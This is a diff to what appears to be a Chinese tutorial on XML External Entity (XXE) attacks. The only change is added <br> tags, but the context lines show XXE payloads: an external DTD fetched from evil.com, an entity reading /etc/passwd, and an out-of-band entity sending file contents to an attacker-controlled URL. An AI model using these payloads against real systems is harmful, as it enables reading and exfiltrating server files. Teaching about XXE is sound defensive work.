@@ -54,6 +54,7 @@ XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF�
 ]>
 <test>&xxe;</test>
 ```
+<br>
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE a [
@@ -64,6 +65,7 @@ XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF�
 
 evil.dtd中的内容为：<!ENTITY b SYSTEM "file:///etc/passwd" >
 ```
+<br>
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE a SYSTEM "http://evil.com/evil.dtd">
@@ -108,6 +110,7 @@ evil.dtd中的内容为：<!ENTITY b SYSTEM "file:///etc/passwd" >
 <!--evil.xml内容：-->
 <!ENTITY % payload "<!ENTITY % send SYSTEM 'http://Your IP/a.php?content=%ttt;'>">
 ```
+<br>
 ```xml
 <?xml version="1.0"?>  
 <!DOCTYPE ANY[  
